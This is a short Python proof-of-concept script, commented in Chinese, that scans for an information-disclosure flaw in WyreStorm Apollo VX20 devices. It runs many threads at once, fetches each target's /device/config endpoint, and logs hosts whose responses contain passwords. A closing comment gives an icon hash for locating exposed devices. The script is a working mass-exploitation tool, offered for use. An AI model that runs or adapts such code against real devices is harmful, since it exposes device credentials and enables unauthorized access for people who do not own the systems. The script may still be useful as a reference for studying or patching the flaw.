import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """WyreStorm Apollo VX20 信息泄露"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='WyreStorm Apollo VX20 信息泄露漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    api_payload = "/device/config"
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT4.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/37.0.2049.0Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'password' in response.text:
            print(f"[+]{target}存在信息泄露漏洞")
            with open('result.txt', 'a') as f:
                f.write(f"{target}\n")
        else:
            print(f"[-]{target}不存在信息泄露漏洞")
    except:
        print(f"{target}可能存在信息泄露漏洞请手工测试")
if __name__ == '__main__':
    main()

# icon_hash="-893957814"